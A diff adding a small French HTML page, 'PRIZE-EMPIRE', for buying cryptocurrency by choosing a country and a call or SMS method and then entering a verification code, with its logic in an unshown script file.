@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PRIZE-EMPIRE - Achat Cryptomonnaie</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="content">
+        <h1>PRIZE-EMPIRE</h1>
+        <h2>Choisissez votre pays pour acheter de la cryptomonnaie</h2>
+
+        <!-- Sélection du pays -->
+        <select id="countrySelect" onchange="showPhoneNumber()">
+            <option value="">Sélectionner un pays</option>
+            
+        <!-- Ajoute d'autres pays selon ton besoin -->
+            <option value="BE">Belgique</option>
+            <option value="FR">France</option>
+            <option value="ES">Espagne</option>
+
+        </select>
+
+        <!-- Choix entre appel ou SMS -->
+        <select id="methodSelect" onchange="showPhoneNumber()">
+            <option value="">Choisir méthode</option>
+            <option value="call">Appel</option>
+            <option value="sms">SMS</option>
+        </select>
+
+        <!-- Affichage du numéro en fonction du pays et de la méthode -->
+        <div id="phoneNumberDisplay" style="display:none;">
+            <p>Numéro d'appel ou SMS : <span id="phoneNumber"></span></p>
+            <label for="verificationCode">Entrez le code reçu :</label>
+            <input type="text" id="verificationCode" placeholder="Code de vérification">
+            <button onclick="submitVerificationCode()">Envoyer</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
